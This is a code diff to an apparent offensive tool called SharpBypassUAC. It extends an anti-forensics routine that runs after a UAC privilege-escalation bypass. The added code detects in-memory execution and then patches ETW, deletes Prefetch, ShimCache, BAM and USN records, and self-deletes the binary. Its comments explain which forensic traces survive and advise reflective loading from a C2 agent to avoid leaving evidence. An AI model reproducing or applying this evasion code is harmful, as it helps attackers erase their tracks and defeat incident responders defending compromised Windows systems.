@@ -197,60 +197,130 @@ namespace SharpBypassUAC
         }
 
         // ================================================================
+        // In-memory execution detection
+        // ================================================================
+
+        /// <summary>
+        /// Detect if the assembly is running in-memory (execute-assembly,
+        /// Assembly.Load, reflective loading) vs from a file on disk.
+        ///
+        /// Indicators:
+        ///   - Assembly.GetEntryAssembly()?.Location returns "" when loaded
+        ///     via Assembly.Load(byte[]) or execute-assembly
+        ///   - Assembly.GetExecutingAssembly().Location also returns "" for
+        ///     in-memory loaded assemblies
+        ///
+        /// When running in-memory:
+        ///   - No file on disk → no Prefetch, no ShimCache entry, no USN record
+        ///   - Self-delete is meaningless (nothing to delete)
+        ///   - ETW bypass still applies (current process generates events)
+        ///   - BAM/DAM may still log the HOST process (e.g., the C2 agent)
+        /// </summary>
+        private static bool _inMemory = false;
+
+        public static bool IsInMemory()
+        {
+            try
+            {
+                // Primary check: entry assembly location
+                var entry = System.Reflection.Assembly.GetEntryAssembly();
+                if (entry == null || string.IsNullOrEmpty(entry.Location))
+                {
+                    _inMemory = true;
+                    return true;
+                }
+
+                // Secondary check: executing assembly location
+                var executing = System.Reflection.Assembly.GetExecutingAssembly();
+                if (executing != null && string.IsNullOrEmpty(executing.Location))
+                {
+                    _inMemory = true;
+                    return true;
+                }
+
+                return false;
+            }
+            catch
+            {
+                // If reflection fails, assume in-memory (safer default)
+                _inMemory = true;
+                return true;
+            }
+        }
+
+        // ================================================================
         // Public API
         // ================================================================
 
         /// <summary>
         /// Run all anti-forensic routines. Call AFTER bypass succeeds and
         /// elevated payload is running.
+        ///
+        /// Automatically detects in-memory vs disk execution context:
+        ///   - Disk:      full cleanup (ETW + Prefetch + ShimCache + BAM + USN + self-delete)
+        ///   - In-memory: ETW patch + BAM cleanup only (no disk artifacts to clean)
         /// </summary>
-        /// <param name="selfPath">Full path to this binary, for self-delete.</param>
+        /// <param name="selfPath">Full path to this binary, for self-delete. Can be null for in-memory execution.</param>
         /// <param name="isElevated">True if running as high integrity (post-bypass).</param>
         public static void Run(string selfPath, bool isElevated)
         {
-            Console.WriteLine("[*] Anti-forensic cleanup starting...");
+            bool inMem = IsInMemory();
 
-            // ---- 1. ETW bypass (always, any integrity) ----
+            if (inMem)
+                Console.WriteLine("[*] Anti-forensic cleanup starting (in-memory mode)...");
+            else
+                Console.WriteLine("[*] Anti-forensic cleanup starting...");
+
+            // ---- 1. ETW bypass (always, any integrity, any context) ----
             PatchEtw();
 
-            // ---- 2. Prefetch cleanup (high integrity required) ----
-            if (isElevated)
+            // ---- Disk-only operations: skip when running in-memory ----
+            if (!inMem)
             {
-                CleanPrefetch(selfPath);
-            }
+                // ---- 2. Prefetch cleanup (high integrity required) ----
+                if (isElevated)
+                    CleanPrefetch(selfPath);
 
-            // ---- 3. ShimCache / AppCompatCache flush (high integrity) ----
-            if (isElevated)
-            {
-                FlushShimCache();
+                // ---- 3. ShimCache / AppCompatCache flush (high integrity) ----
+                if (isElevated)
+                    FlushShimCache();
             }
 
             // ---- 4. BAM/DAM cleanup (high integrity) ----
+            // BAM may log the host process even for in-memory execution
             if (isElevated)
             {
                 CleanBAM();
             }
 
-            // ---- 5. USN Journal flush for specific files (high integrity) ----
-            if (isElevated)
+            // ---- Disk-only operations continued ----
+            if (!inMem)
             {
-                FlushUsnJournal();
+                // ---- 5. USN Journal flush for specific files (high integrity) ----
+                if (isElevated)
+                    FlushUsnJournal();
+
+                // ---- 6. Self-delete via rename trick ----
+                SelfDelete(selfPath);
             }
 
-            // ---- 6. Self-delete via rename trick ----
-            SelfDelete(selfPath);
-
-            Console.WriteLine("[+] Anti-forensic cleanup complete");
+            if (inMem)
+                Console.WriteLine("[+] Anti-forensic cleanup complete (in-memory: no disk artifacts to clean)");
+            else
+                Console.WriteLine("[+] Anti-forensic cleanup complete");
         }
 
         /// <summary>
-        /// Lightweight version: only ETW patch + self-delete.
+        /// Lightweight version: only ETW patch + self-delete (if on disk).
         /// For medium integrity (pre-bypass) scenarios.
         /// </summary>
         public static void RunLight(string selfPath)
         {
             PatchEtw();
-            SelfDelete(selfPath);
+
+            // Self-delete only makes sense when running from disk
+            if (!IsInMemory())
+                SelfDelete(selfPath);
         }
 
         // ================================================================
@@ -344,8 +414,30 @@ namespace SharpBypassUAC
 
         // ================================================================
         // 3. ShimCache / AppCompatCache flush
-        //    Deleting the AppCompatCache value forces rebuild on next boot,
-        //    removing evidence of this binary's execution.
+        //
+        // IMPORTANT LIMITATION:
+        //   AppCompatCache has TWO copies:
+        //     (a) Kernel memory (ahcache.sys) — LIVE cache, updated immediately
+        //         when any binary is created/modified on disk. NOT accessible
+        //         from userland. Live forensic tools (Volatility, KAPE) can
+        //         extract this.
+        //     (b) Registry value — snapshot written ONLY at shutdown/reboot.
+        //         This is what we delete here.
+        //
+        //   Deleting the registry value removes the OLD snapshot (from previous
+        //   boot) but does NOT touch the live kernel cache. On next shutdown,
+        //   the kernel writes its current cache back → our entry reappears.
+        //
+        //   On servers that rarely reboot, this means:
+        //     - Registry snapshot is stale (pre-boot data) → deleting it
+        //       removes old evidence but our entry survives in kernel memory
+        //     - Live acquisition WILL find our entry regardless
+        //
+        //   Best mitigation: avoid disk-based execution entirely (reflective
+        //   loading, execute-assembly) → no file on disk → no ShimCache entry.
+        //   This function is a partial measure — it clears the registry
+        //   snapshot and reduces offline forensic evidence when combined with
+        //   self-delete and Prefetch cleanup.
         // ================================================================
         private static void FlushShimCache()
         {
@@ -367,12 +459,13 @@ namespace SharpBypassUAC
                     return;
                 }
 
-                // Delete AppCompatCache value — forces Windows to rebuild it
+                // Delete AppCompatCache value — clears registry snapshot only.
+                // Live kernel cache (ahcache.sys) is NOT affected.
                 result = regDeleteValue(hKey, "AppCompatCache");
                 regCloseKey(hKey);
 
                 if (result == ERROR_SUCCESS)
-                    Console.WriteLine("[+] ShimCache: AppCompatCache deleted (rebuilds on reboot)");
+                    Console.WriteLine("[+] ShimCache: registry snapshot deleted (kernel cache still live)");
                 else
                     Console.WriteLine("[-] ShimCache: RegDeleteValue failed (" + result + ")");
             }
